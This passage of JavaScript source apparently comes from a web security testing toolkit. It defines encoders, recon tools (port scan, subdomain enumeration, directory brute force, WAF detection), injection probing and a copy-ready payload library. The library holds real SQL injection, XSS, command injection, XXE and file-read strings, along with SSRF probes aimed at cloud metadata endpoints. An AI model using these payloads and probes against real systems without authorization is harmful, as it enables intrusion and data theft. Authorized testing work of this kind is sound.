      rows.push('<div class="result-kv"><span class="k">'+a+'</span><span class="v">'+hex+'</span></div>');
    }
    return { html: rows.join('') };
  },
});

reg('encode', {
  id: 'b64', icon: '🔤', name: 'Base64',
  description: 'Encode / decode Base64',
  fields: [
    { name:'mode', label:'Mode', type:'select', options:['encode','decode'], default:'encode' },
    { name:'text', label:'Input', type:'textarea' },
  ],
  auto: function(){ return { mode:'encode', text:'' }; },
  run: async function(inp){
    if (!inp.text) throw new Error('text required');
    try {
      var out = inp.mode === 'decode'
        ? decodeURIComponent(escape(atob(inp.text.trim())))
        : btoa(unescape(encodeURIComponent(inp.text)));
      return { html:'<div class="result-kv"><span class="k">'+inp.mode+'</span>'
        + '<span class="v">'+esc(out)+'</span></div>' };
    } catch(e){
      return { html:'<div class="result-msg err">'+esc(String(e))+'</div>' };
    }
  },
});

reg('encode', {
  id: 'urlenc', icon: '🔗', name: 'URL Encode',
  description: 'Percent-encode / decode',
  fields: [
    { name:'mode', label:'Mode', type:'select', options:['encode','decode'], default:'encode' },
    { name:'text', label:'Input', type:'textarea' },
  ],
  auto: function(){ return { mode:'encode', text:'' }; },
  run: async function(inp){
    if (!inp.text) throw new Error('text required');
    var out = inp.mode === 'decode' ? decodeURIComponent(inp.text) : encodeURIComponent(inp.text);
    return { html:'<div class="result-kv"><span class="k">'+inp.mode+'</span>'
      + '<span class="v">'+esc(out)+'</span></div>' };
  },
});

reg('encode', {
  id: 'hex', icon: '⬛', name: 'Hex',
  description: 'Encode / decode hex',
  fields: [
    { name:'mode', label:'Mode', type:'select', options:['encode','decode'], default:'encode' },
    { name:'text', label:'Input', type:'textarea' },
  ],
  auto: function(){ return { mode:'encode', text:'' }; },
  run: async function(inp){
    if (!inp.text) throw new Error('text required');
    var out;
    if (inp.mode === 'encode'){
      out = Array.from(new TextEncoder().encode(inp.text))
        .map(function(b){return b.toString(16).padStart(2,'0');}).join('');
    } else {
      var hex = inp.text.replace(/\s+/g,'');
      var bytes = new Uint8Array(hex.length/2);
      for (var i = 0; i < bytes.length; i++) bytes[i] = parseInt(hex.substr(i*2,2),16);
      out = new TextDecoder().decode(bytes);
    }
    return { html:'<div class="result-kv"><span class="k">'+inp.mode+'</span>'
      + '<span class="v" style="word-break:break-all">'+esc(out)+'</span></div>' };
  },
});

reg('encode', {
  id: 'caesar', icon: '🔄', name: 'ROT13 / Caesar',
  description: 'Brute-force all 25 shifts',
  fields: [{ name:'text', label:'Ciphertext', type:'textarea' }],
  auto: function(){ return { text:'' }; },
  run: async function(inp){
    if (!inp.text) throw new Error('text required');
    var rows = [];
    for (var shift = 1; shift <= 25; shift++){
      var out = inp.text.replace(/[a-zA-Z]/g, function(c){
        var b = c <= 'Z' ? 65 : 97;
        return String.fromCharCode(((c.charCodeAt(0) - b + shift) % 26) + b);
      });
      rows.push('<div class="result-kv"><span class="k">'+shift+'</span>'
        + '<span class="v">'+esc(out.slice(0,120))+'</span></div>');
    }
    return { html: rows.join('') };
  },
});

reg('encode', {
  id: 'pw_strength', icon: '🔒', name: 'Password Strength',
  description: 'Estimate entropy + class coverage',
  fields: [{ name:'pw', label:'Password', placeholder:'type any password' }],
  auto: function(){ return { pw:'' }; },
  run: async function(inp){
    if (!inp.pw) throw new Error('password required');
    var len = inp.pw.length;
    var classes = 0;
    if (/[a-z]/.test(inp.pw)) classes++;
    if (/[A-Z]/.test(inp.pw)) classes++;
    if (/[0-9]/.test(inp.pw)) classes++;
    if (/[^A-Za-z0-9]/.test(inp.pw)) classes++;
    var alphabet = [0,26,52,62,94][classes];
    var entropy = Math.round(len * Math.log2(alphabet || 1));
    var score = entropy < 28 ? 'very weak'
              : entropy < 36 ? 'weak'
              : entropy < 60 ? 'reasonable'
              : entropy < 128 ? 'strong'
              : 'very strong';
    var color = entropy < 28 ? '#f87171' : entropy < 60 ? '#f59e0b' : '#10b981';
    return { html:'<div class="result-kv"><span class="k">Length</span><span class="v">'+len+'</span></div>'
      + '<div class="result-kv"><span class="k">Classes</span><span class="v">'+classes+'/4</span></div>'
      + '<div class="result-kv"><span class="k">Entropy</span><span class="v">'+entropy+' bits</span></div>'
      + '<div class="result-kv"><span class="k">Rating</span><span class="v" style="color:'+color+'">'+score+'</span></div>' };
  },
});

reg('encode', {
  id: 'timestamp', icon: '🕒', name: 'Timestamp',
  description: 'Unix ↔ ISO conversion',
  fields: [{ name:'input', label:'Unix or ISO', placeholder:'1700000000 or 2024-01-01T00:00:00Z' }],
  auto: function(){ return { input: String(Math.floor(Date.now()/1000)) }; },
  run: async function(inp){
    var v = (inp.input || '').trim();
    if (!v) throw new Error('input required');
    var out = [];
    if (/^\d+$/.test(v)){
      var n = parseInt(v, 10);
      if (v.length <= 10) n *= 1000;
      var d = new Date(n);
      if (isNaN(d.getTime())) throw new Error('invalid timestamp');
      out.push(['Unix (s)',  String(Math.floor(n/1000))]);
      out.push(['Unix (ms)', String(n)]);
      out.push(['ISO 8601',  d.toISOString()]);
      out.push(['UTC',       d.toUTCString()]);
      out.push(['Local',     d.toString()]);
      out.push(['Relative',  relativeTime(d)]);
    } else {
      var d2 = new Date(v);
      if (isNaN(d2.getTime())) throw new Error('unrecognized format');
      out.push(['Unix (s)',  String(Math.floor(d2.getTime()/1000))]);
      out.push(['Unix (ms)', String(d2.getTime())]);
      out.push(['ISO 8601',  d2.toISOString()]);
      out.push(['UTC',       d2.toUTCString()]);
    }
    return { html: out.map(function(r){
      return '<div class="result-kv"><span class="k">'+esc(r[0])+'</span><span class="v">'+esc(r[1])+'</span></div>';
    }).join('') };
  },
});

function relativeTime(d){
  var s   = Math.round((d.getTime() - Date.now()) / 1000);
  var abs = Math.abs(s);
  var units = [['year',31536000],['month',2592000],['day',86400],
               ['hour',3600],['minute',60],['second',1]];
  for (var i = 0; i < units.length; i++){
    if (abs >= units[i][1]){
      var n = Math.floor(abs / units[i][1]);
      var suf = n > 1 ? 's' : '';
      return s < 0 ? n+' '+units[i][0]+suf+' ago' : 'in '+n+' '+units[i][0]+suf;
    }
  }
  return 'now';
}

// ---------------- PAYLOADS ----------------
var PAYLOAD_LIB = {
  sqli:      { label:'SQL Injection',   items:["'", "''", "' OR '1'='1", "' OR 1=1--",
                "' OR 1=1#", "\" OR \"1\"=\"1", "' UNION SELECT NULL--", "1' AND 1=1--",
                "') OR ('1'='1", "'))--", "';WAITFOR DELAY '0:0:0'--",
                "' AND extractvalue(1,concat(0x7e,version()))--"] },
  nosqli:    { label:'NoSQL Injection', items:["' || '1'=='1", "{\"$ne\": null}",
                "{\"$gt\": \"\"}", "{\"$where\": \"1==1\"}", "[$ne]=1", "[$regex]=.*"] },
  xss:       { label:'XSS',             items:["<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>",
                "'><svg onload=alert(1)>", "javascript:alert(1)",
                "<body onload=alert(1)>", "<iframe src=javascript:alert(1)>",
                "<details open ontoggle=alert(1)>"] },
  lfi:       { label:'LFI / Traversal', items:["../../../../etc/passwd",
                "..%2F..%2F..%2Fetc%2Fpasswd", "....//....//....//etc/passwd",
                "..\\..\\..\\windows\\win.ini", "/proc/self/environ",
                "php://filter/convert.base64-encode/resource=index.php"] },
  rfi:       { label:'RFI',             items:["https://example.com/shell.txt",
                "//example.com/shell", "data://text/plain,<?php echo 1;?>"] },
  ssti:      { label:'SSTI',            items:["{{7*7}}", "${7*7}", "#{7*7}",
                "<%= 7*7 %>", "{{config}}", "{{self}}", "*{7*7}"] },
  cmdi:      { label:'Command Injection', items:[";id", "|id", "&&id", "||id",
                "`id`", "$(id)", ";whoami", "%0Aid", "$IFS$9id"] },
  xxe:       { label:'XXE',             items:[
                '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><r>&x;</r>',
                '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://example.com/">]><r>&x;</r>'] },
  ssrf:      { label:'SSRF',            items:["http://127.0.0.1",
                "http://169.254.169.254/latest/meta-data/",
                "http://metadata.google.internal/", "file:///etc/passwd",
                "gopher://127.0.0.1:6379/_INFO", "http://[::1]/"] },
  crlf:      { label:'CRLF',            items:["%0d%0aX-Injected: lynk",
                "%0aX-Injected: lynk", "\\r\\nX-Injected: lynk"] },
  open_redirect: { label:'Open Redirect', items:["//evil.example",
                "https://evil.example", "\\/\\/evil.example", "/\\evil.example",
                "https:evil.example", "////evil.example"] },
  host_header:   { label:'Host Header', items:["evil.example", "127.0.0.1",
                "localhost", "evil.example:8080"] },
  path_traversal:{ label:'Path Traversal', items:["..;/", "..%2f", "..%5c",
                "..%252f", "%2e%2e/", "....//"] },
  http_smuggling:{ label:'HTTP Smuggling', items:["Transfer-Encoding: chunked",
                "Transfer-Encoding: chunked\r\nContent-Length: 6",
                "Transfer-Encoding : chunked"] },
};

reg('payloads', {
  id: 'payload_library', icon: '📜', name: 'Payload Library',
  description: 'Curated probes for every category (copy-ready)',
  fields: [{ name:'cat', label:'Category', type:'select',
    options: Object.keys(PAYLOAD_LIB), default:'sqli' }],
  auto: function(){ return { cat:'sqli' }; },
  run: async function(inp){
    var cat = PAYLOAD_LIB[inp.cat];
    if (!cat) throw new Error('unknown category');
    var html = '<div style="margin-bottom:10px;color:#94a3b8;font-size:12px">'
      + cat.items.length + ' payloads · ' + esc(cat.label) + '</div>';
    cat.items.forEach(function(p){
      html += '<div class="result-list-item">'
        + '<span style="flex:1;font-family:ui-monospace,monospace;font-size:11.5px;'
        + 'word-break:break-all">' + esc(p) + '</span>'
        + '<button class="btn small" data-copy="' + esc(p) + '">⧉</button></div>';
    });
    setTimeout(function(){
      document.querySelectorAll('#kit-main button[data-copy]').forEach(function(b){
        b.onclick = function(){
          navigator.clipboard.writeText(b.dataset.copy);
          toast('Payload copied');
        };
      });
    }, 0);
    return { html: html };
  },
});

// ---------------- RECON (backend) ----------------
reg('recon', {
  id: 'vulnscan', icon: '🛡️', name: 'Vulnerability Scan',
  description: 'Headers, cookies, JS libs, paths, methods, CORS',
  fields: [
    { name:'url',    label:'URL', placeholder:'https://example.com' },
    { name:'active', label:'Active probes', type:'select',
      options:['1','0'], default:'1' },
  ],
  auto: function(){ return { url: L.activeTabUrl(), active:'1' }; },
  run: async function(inp){
    if (!inp.url) throw new Error('url required');
    var r = await backendPost('/tool/vulnscan', { url: inp.url, active: inp.active });
    if (!r.data)              throw new Error('scan failed (' + r.status + ')');
    if (r.data.error)         throw new Error(r.data.error);
    var f = r.data.findings || [];
    var counts = {critical:0,high:0,medium:0,low:0,info:0};
    f.forEach(function(x){ counts[x.severity] = (counts[x.severity]||0)+1; });
    var summary = Object.keys(counts).map(function(k){
      if (!counts[k]) return '';
      return '<div class="report-stat '+k+'"><div class="n">'+counts[k]+'</div>'
        + '<div class="l">'+k+'</div></div>';
    }).join('');
    var listHtml = f.map(function(x){
      return '<div class="finding '+x.severity+'">'
        + '<div class="finding-head">'
        +   '<span class="sev '+x.severity+'">'+x.severity+'</span>'
        +   '<span class="title">'+esc(x.name)+'</span>'
        +   '<span class="cwe">'+esc(x.id||'')+'</span>'
        + '</div>'
        + '<div class="finding-desc">'+esc(x.description||'')+'</div>'
        + (x.evidence ? '<pre class="finding-evidence">'+esc(x.evidence)+'</pre>' : '')
        + (x.remediation ? '<div class="finding-remediation"><b>Fix:</b> '+esc(x.remediation)+'</div>' : '')
        + (x.path ? '<div class="finding-meta"><span>Route: '+esc(x.path)+'</span></div>' : '')
        + '</div>';
    }).join('');
    var html = '<div class="report-summary">'+summary+'</div>'
      + '<div style="display:flex;gap:8px;margin-bottom:14px">'
      +   '<button class="btn small" id="kit-vs-json">⬇ JSON</button>'
      +   '<button class="btn small" id="kit-vs-md">⬇ Markdown</button>'
      + '</div>'
      + (listHtml || '<div class="result-msg ok">No findings.</div>');
    setTimeout(function(){
      var jb = document.querySelector('#kit-vs-json');
      if (jb) jb.onclick = function(){ dl('vulnscan.json', JSON.stringify(r.data, null, 2)); };
      var mb = document.querySelector('#kit-vs-md');
      if (mb) mb.onclick = function(){
        var md = '# Vulnerability Report\n\nTarget: '+inp.url+'\n\n';
        f.forEach(function(x){
          md += '## ['+x.severity.toUpperCase()+'] '+x.name+'\n\n'
            + '- **ID**: '+x.id+'\n'
            + '- **Description**: '+x.description+'\n'
            + (x.evidence ? '- **Evidence**:\n  ```\n  '+x.evidence.replace(/\n/g,'\n  ')+'\n  ```\n' : '')
            + (x.remediation ? '- **Fix**: '+x.remediation+'\n' : '')
            + '\n';
        });
        dl('vulnscan.md', md);
      };
    }, 0);
    var clientFindings = f.map(function(x){
      return { severity:x.severity, cwe:x.id, title:x.name,
               desc:x.description, evidence:x.evidence,
               remediation:x.remediation, tabUrl:inp.url };
    });
    return { html: html, findings: clientFindings };
  },
});

reg('recon', {
  id: 'subdomains', icon: '🌐', name: 'Subdomain Enum',
  description: 'Certificate Transparency',
  fields: [{ name:'domain', label:'Domain', placeholder:'example.com' }],
  auto: function(){ return { domain: L.activeTabHost() }; },
  run: async function(inp){
    if (!inp.domain) throw new Error('domain required');
    var r = await backendPost('/tool/subdomains', { domain: inp.domain });
    if (!r.data || r.data.error) throw new Error((r.data && r.data.error) || 'failed');
    var subs = r.data.subdomains || [];
    var html = '<div style="display:flex;align-items:center;gap:10px;margin-bottom:10px">'
      + '<span style="color:#38bdf8;font-weight:700">'+subs.length+' subdomains</span>'
      + '<button class="btn small" id="kit-subs-dl">⬇ Download</button></div>';
    subs.forEach(function(s){
      html += '<div class="result-list-item">'
        + '<a href="/proxy?url=' + encodeURIComponent('https://'+s) + '" target="_blank">'
        + esc(s) + '</a></div>';
    });
    setTimeout(function(){
      var b = document.querySelector('#kit-subs-dl');
      if (b) b.onclick = function(){ dl(inp.domain+'_subdomains.txt', subs.join('\n')); };
    }, 0);
    return { html: html };
  },
});

reg('recon', {
  id: 'portscan', icon: '📡', name: 'Port Scan',
  description: 'Common ports',
  fields: [{ name:'host', label:'Host', placeholder:'example.com' }],
  auto: function(){ return { host: L.activeTabHost() }; },
  run: async function(inp){
    if (!inp.host) throw new Error('host required');
    var r = await backendPost('/tool/portscan', { host: inp.host });
    if (!r.data || r.data.error) throw new Error((r.data && r.data.error) || 'failed');
    var ports = r.data.open || [];
    if (!ports.length) return { html: '<div class="result-msg info">No open ports from the common set.</div>' };
    var html = '<div style="color:#38bdf8;font-weight:700;margin-bottom:10px">'
      + ports.length + ' open</div>';
    ports.forEach(function(p){
      html += '<div class="result-kv"><span class="k">OPEN</span>'
        + '<span class="v">'+esc(inp.host)+':'+p.port
        + (p.service ? ' · '+esc(p.service) : '')+'</span></div>';
    });
    return { html: html };
  },
});

reg('recon', {
  id: 'ssltls', icon: '🔐', name: 'SSL / TLS Info',
  description: 'Certificate, cipher, ALPN, SANs',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('url required');
    var r = await backendPost('/tool/ssltls', { url: inp.url });
    if (!r.data || r.data.error) throw new Error((r.data && r.data.error) || 'failed');
    var html = '';
    Object.keys(r.data).forEach(function(k){
      var v = r.data[k];
      var txt = (v !== null && typeof v === 'object') ? JSON.stringify(v) : String(v);
      html += '<div class="result-kv"><span class="k">'+esc(k)+'</span>'
        + '<span class="v">'+esc(txt)+'</span></div>';
    });
    return { html: html };
  },
});

reg('recon', {
  id: 'waf_detect', icon: '🔥', name: 'WAF Detect',
  description: 'Signature + evasion probes',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('url required');
    var r = await backendPost('/tool/waf', { url: inp.url });
    if (!r.data) throw new Error('failed');
    var det = r.data.detected || [];
    var html = det.length
      ? '<div class="result-msg info"><b>Detected:</b> '+esc(det.join(', '))+'</div>'
      : '<div class="result-msg info">No specific WAF identified.</div>';
    (r.data.probes || []).forEach(function(p){
      html += '<div class="result-kv"><span class="k">'+esc(p.label)+'</span>'
        + '<span class="v">'
        + (p.error
            ? '<span style="color:#f87171">'+esc(p.error)+'</span>'
            : esc(String(p.status)) + (p.blocked ? ' · blocked' : ''))
        + '</span></div>';
    });
    return { html: html };
  },
});

reg('recon', {
  id: 'wayback', icon: '🕰️', name: 'Wayback Machine',
  description: 'Archived snapshots',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('url required');
    var r = await backendPost('/tool/wayback', { url: inp.url });
    if (!r.data || r.data.error) throw new Error((r.data && r.data.error) || 'failed');
    var s = r.data.snapshots || [];
    if (!s.length) return { html: '<div class="result-msg info">No snapshots.</div>' };
    return { html:
      '<div style="color:#38bdf8;font-weight:700;margin-bottom:10px">'
      + s.length + ' snapshots</div>'
      + s.map(function(x){
          return '<div class="result-list-item">'
            + '<span style="color:#64748b;font-family:ui-monospace,monospace">'
            + esc(x.timestamp)+'</span>'
            + '<a href="/proxy?url='+encodeURIComponent(x.url)+'" target="_blank">'
            + esc(x.url)+'</a></div>';
        }).join('') };
  },
});

reg('recon', {
  id: 'favicon', icon: '🎨', name: 'Favicon Hash',
  description: 'Favicon fingerprint',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('url required');
    var r = await backendPost('/tool/favicon', { url: inp.url });
    if (!r.data || r.data.error) throw new Error((r.data && r.data.error) || 'failed');
    return { html: Object.keys(r.data).map(function(k){
      return '<div class="result-kv"><span class="k">'+esc(k)+'</span>'
        + '<span class="v">'+esc(String(r.data[k]))+'</span></div>';
    }).join('') };
  },
});

reg('recon', {
  id: 'dns_deep', icon: '🔭', name: 'DNS Deep',
  description: 'A, AAAA via system resolver',
  fields: [{ name:'url', label:'URL or host', placeholder:'example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('url required');
    var r = await backendPost('/tool/dns-deep', { url: inp.url });
    if (!r.data || r.data.error) throw new Error((r.data && r.data.error) || 'failed');
    var html = '<div class="result-kv"><span class="k">Host</span>'
      + '<span class="v">'+esc(r.data.host||'')+'</span></div>';
    (r.data.a    || []).forEach(function(ip){
      html += '<div class="result-kv"><span class="k">A</span>'
        + '<span class="v">'+esc(ip)+'</span></div>'; });
    (r.data.aaaa || []).forEach(function(ip){
      html += '<div class="result-kv"><span class="k">AAAA</span>'
        + '<span class="v">'+esc(ip)+'</span></div>'; });
    return { html: html };
  },
});

reg('recon', {
  id: 'well_known', icon: '📜', name: 'Well-Known Probe',
  description: 'Curated .well-known URIs',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('url required');
    var r = await backendPost('/tool/well-known', { url: inp.url });
    if (!r.data) throw new Error('failed');
    var hits = (r.data.results || []).filter(function(x){ return x.status === 200; });
    if (!hits.length)
      return { html: '<div class="result-msg info">Nothing found.</div>' };
    return { html: hits.map(function(x){
      return '<div class="result-list-item">'
        + '<span class="badge">200</span>'
        + '<a href="/proxy?url='+encodeURIComponent(x.url)+'" target="_blank">'
        + esc(x.path)+'</a>'
        + '<span style="color:#64748b;font-size:11px">'+x.length+'B</span></div>';
    }).join('') };
  },
});

reg('recon', {
  id: 'api_discover', icon: '🔌', name: 'API Discovery',
  description: 'Common API path patterns',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('url required');
    var r = await backendPost('/tool/api-discover', { url: inp.url });
    if (!r.data) throw new Error('failed');
    var hits = (r.data.results || []).filter(function(x){
      return x.status && x.status !== 404;
    });
    if (!hits.length)
      return { html: '<div class="result-msg info">No API paths found.</div>' };
    return { html: hits.map(function(x){
      return '<div class="result-list-item">'
        + '<span class="badge">'+x.status+'</span>'
        + '<a href="/proxy?url='+encodeURIComponent(x.url)+'" target="_blank">'
        + esc(x.path)+'</a>'
        + '<span style="color:#64748b;font-size:11px">'+x.length+'B</span></div>';
    }).join('') };
  },
});

reg('recon', {
  id: 'robots_txt', icon: '🤖', name: 'robots.txt',
  description: 'Fetch /robots.txt',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    var r = await fetchText('/tool/robots?url=' + encodeURIComponent(inp.url || ''));
    return { html: '<pre class="result-pre">'+esc(r.body)+'</pre>' };
  },
});

reg('recon', {
  id: 'sitemap_xml', icon: '🗺️', name: 'sitemap.xml',
  description: 'Fetch /sitemap.xml',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    var r = await fetchText('/tool/sitemap?url=' + encodeURIComponent(inp.url || ''));
    return { html: '<pre class="result-pre">'+esc(r.body)+'</pre>' };
  },
});

reg('recon', {
  id: 'headers_audit', icon: '📡', name: 'Response Headers',
  description: 'Full response header dump',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    var r = await backendGet('/tool/headers?url=' + encodeURIComponent(inp.url || ''));
    if (!r.data) throw new Error('failed');
    var html = '<div class="result-kv"><span class="k">Status</span>'
      + '<span class="v">'+r.data.status+'</span></div>';
    Object.keys(r.data.headers || {}).forEach(function(k){
      html += '<div class="result-kv"><span class="k">'+esc(k)+'</span>'
        + '<span class="v">'+esc(r.data.headers[k])+'</span></div>';
    });
    return { html: html };
  },
});

reg('recon', {
  id: 'tech_scan', icon: '🧬', name: 'Tech Fingerprint',
  description: 'Security headers + tech detection',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    var r = await backendGet('/tool/scan?url=' + encodeURIComponent(inp.url || ''));
    if (!r.data) throw new Error('failed');
    var html = '<div style="font-weight:700;margin-bottom:8px;color:#38bdf8">🛡️ Security</div>';
    Object.keys(r.data.security || {}).forEach(function(k){
      var v = r.data.security[k];
      html += '<div class="result-kv"><span class="k">'+esc(k)+'</span>'
        + '<span class="v">' + (v.ok ? '✅' : '⚠️') + ' ' + esc(v.note||'') + '</span></div>';
    });
    html += '<div style="font-weight:700;margin:14px 0 8px;color:#38bdf8">🧬 Tech</div>';
    (r.data.tech || []).forEach(function(t){
      html += '<span style="display:inline-block;padding:4px 12px;margin:3px;'
        + 'background:rgba(56,189,248,.15);color:#38bdf8;border-radius:999px;'
        + 'font-size:11.5px">'+esc(t)+'</span>';
    });
    return { html: html };
  },
});

reg('recon', {
  id: 'diag', icon: '🩺', name: 'Diagnose URL',
  description: 'DNS + TCP + TLS breakdown',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    var r = await backendGet('/tool/diag?url=' + encodeURIComponent(inp.url || ''));
    if (!r.data) throw new Error('failed');
    var out = '';
    function list(label, arr){
      if (!arr || !arr.length) return;
      out += '<div class="result-kv"><span class="k">'+esc(label)+'</span>'
        + '<span class="v">'+arr.map(esc).join('<br>')+'</span></div>';
    }
    out += '<div class="result-kv"><span class="k">Host</span><span class="v">'
      + esc((r.data.host||'') + (r.data.port ? ':'+r.data.port : '')) + '</span></div>';
    list('System v4', r.data.system_dns_v4);
    list('System v6', r.data.system_dns_v6);
    list('DoH v4',    r.data.doh_ipv4);
    (r.data.connect_tests || []).forEach(function(t){
      out += '<div class="result-kv"><span class="k">'+(t.ok?'OK':'FAIL')+'</span>'
        + '<span class="v">'+esc(t.ip||'')
        + (t.ok ? ' · '+t.latency_ms+'ms' : ' · '+esc(t.error||''))
        + '</span></div>';
    });
    return { html: out };
  },
});

reg('recon', {
  id: 'dirview', icon: '🗂️', name: 'Directory Viewer',
  description: 'Fetch a directory or file and render entries',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com/' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('url required');
    var r = await backendGet('/tool/dirview?url=' + encodeURIComponent(inp.url));
    if (!r.data) throw new Error('failed');
    if (r.data.error) throw new Error(r.data.error);
    if (r.data.kind === 'listing'){
      var html = '<div style="color:#38bdf8;font-weight:700;margin-bottom:10px">'
        + r.data.entries.length + ' entries</div>';
      r.data.entries.forEach(function(e){
        var icon = e.type === 'dir' ? '📁' : '🔗';
        html += '<div class="result-list-item">'
          + '<span>'+icon+'</span>'
          + '<a href="/proxy?url='+encodeURIComponent(e.url)+'" target="_blank">'+esc(e.name)+'</a></div>';
      });
      return { html: html };
    }
    if (r.data.kind === 'text'){
      return { html: '<pre class="result-pre">'+esc(r.data.body || '')+'</pre>' };
    }
    return { html: '<div class="result-msg info">Binary content ('+(r.data.size||0)+' bytes)</div>' };
  },
});

reg('recon', {
  id: 'history_view', icon: '🕘', name: 'Request History',
  description: 'Last 60 proxied requests',
  fields: [],
  auto: function(){ return {}; },
  run: async function(){
    var r = await backendGet('/tool/history');
    var e = (r.data && r.data.entries) || [];
    if (!e.length) return { html: '<div class="result-msg info">No history.</div>' };
    return { html: e.map(function(x){
      return '<div class="result-list-item">'
        + '<span style="color:#64748b">'+x.status+'</span>'
        + '<a href="/proxy?url='+encodeURIComponent(x.url)+'" target="_blank">'+esc(x.url)+'</a>'
        + '</div>';
    }).join('') };
  },
});

reg('recon', {
  id: 'source_view', icon: '📄', name: 'Page Source',
  description: 'Fetch raw HTML source',
  fields: [{ name:'url', label:'URL', placeholder:'https://example.com' }],
  auto: function(){ return { url: L.activeTabUrl() }; },
  run: async function(inp){
    var r = await fetchText('/tool/source?url='+encodeURIComponent(inp.url||''));
    return { html:'<pre class="result-pre">'+esc(r.body.slice(0, 200000))+'</pre>' };
  },
});

reg('recon', {
  id: 'brute', icon: '📁', name: 'Directory Brute',
  description: 'Probe a wordlist of paths',
  fields: [
    { name:'url', label:'Base URL', placeholder:'https://example.com' },
    { name:'paths', label:'Paths (one per line)', type:'textarea',
      default:'admin\napi\nlogin\nbackup.zip\nconfig.json\n.env\n.git/config\nrobots.txt\nwp-admin\nphpinfo.php\nswagger.json' },
  ],
  auto: function(){ return { url: L.activeTabOrigin() }; },
  run: async function(inp){
    if (!inp.url) throw new Error('url required');
    var paths = (inp.paths || '').split('\n').map(function(s){ return s.trim(); }).filter(Boolean);
    var r = await backendPost('/tool/brute', { url: inp.url, paths: JSON.stringify(paths) });
    if (!r.data) throw new Error('failed');
    var hits = (r.data.results||[]).filter(function(x){ return x.status && x.status !== 404; });
    if (!hits.length) return { html: '<div class="result-msg info">No interesting paths.</div>' };
    return { html: '<div style="color:#38bdf8;font-weight:700;margin-bottom:10px">'
      + hits.length + ' interesting of ' + r.data.results.length + '</div>'
      + hits.map(function(x){
          var c = x.status < 300 ? '#10b981' : x.status < 400 ? '#38bdf8' : x.status < 500 ? '#f59e0b' : '#f87171';
          return '<div class="result-list-item">'
            + '<span class="badge" style="background:rgba(0,0,0,.2);color:'+c+'">'+x.status+'</span>'
            + '<span style="flex:1;font-family:ui-monospace,monospace;font-size:11.5px">'+esc(x.path)+'</span>'
            + '<span style="color:#64748b;font-size:11px">'+x.size+'B</span></div>';
        }).join('') };
  },
});

reg('recon', {
  id: 'injection_backend', icon: '💉', name: 'Injection Probes (backend)',
  description: 'Generic probes via backend engine',
  fields: [
    { name:'url', label:'URL', placeholder:'https://example.com/?x=' },
    { name:'kind', label:'Kind', type:'select',
      options: Object.keys(PAYLOAD_LIB), default:'sqli' },
    { name:'method', label:'Method', type:'select',
      options:['GET','POST'], default:'GET' },
    { name:'param', label:'Parameter name (optional)', placeholder:'q' },
    { name:'header', label:'Header name (optional)', placeholder:'X-Custom' },
  ],
  auto: function(){
    return { url: L.activeTabUrl(), kind:'sqli', method:'GET', param:'', header:'' };
  },
  run: async function(inp){
    if (!inp.url) throw new Error('url required');
    var r = await backendPost('/tool/injection', inp);
    if (!r.data || r.data.error) throw new Error((r.data && r.data.error) || 'failed');
    var base = r.data.baseline || {};
    var hits = (r.data.results || []).filter(function(x){ return x.differs; });
    var html = '<div class="result-msg info">Baseline: status '
      + base.status + ' · ' + base.length + 'B · ' + base.time + 'ms<br>'
      + (r.data.results||[]).length + ' probes · ' + hits.length + ' interesting</div>';
    if (!hits.length){
      html += '<div class="result-msg ok">No anomalies detected.</div>';
      return { html: html };
    }
    hits.forEach(function(x){
      html += '<div class="finding high"><div class="finding-head">'
        + '<span class="sev high">ANOMALY</span>'
        + '<span class="title" style="font-family:ui-monospace,monospace;font-size:11.5px">'
        + esc(x.payload) + '</span></div>'
        + '<div class="finding-meta"><span>status: '+x.status+'</span>'
        + '<span>length: '+x.length+'</span>'
        + '<span>time: '+x.time+'ms</span>'
        + '<span>diff: '+esc(x.diff||'')+'</span></div></div>';
    });
    var findings = hits.map(function(x){
      return { severity:'medium', cwe:'CWE-20',
        title:'Injection anomaly (' + inp.kind + ')',
        desc:'Payload altered the response.',
        evidence:'Payload: '+x.payload+'\n'+x.diff,
        remediation:'Validate and encode all user input.',
        tabUrl: inp.url };
    });
    return { html: html, findings: findings };
  },
});

// ---------------- STRESS ----------------
reg('stress', {
  id: 'ratelimit_stress', icon: '🧪', name: 'Rate-Limit Stress',
  description: 'Bounded concurrency probe — measures where the target throttles. Caps: ≤20 concurrent, ≤500 total, ≤50 RPS.',
  fields: [
    { name:'url',         label:'URL', placeholder:'https://example.com/api/thing' },
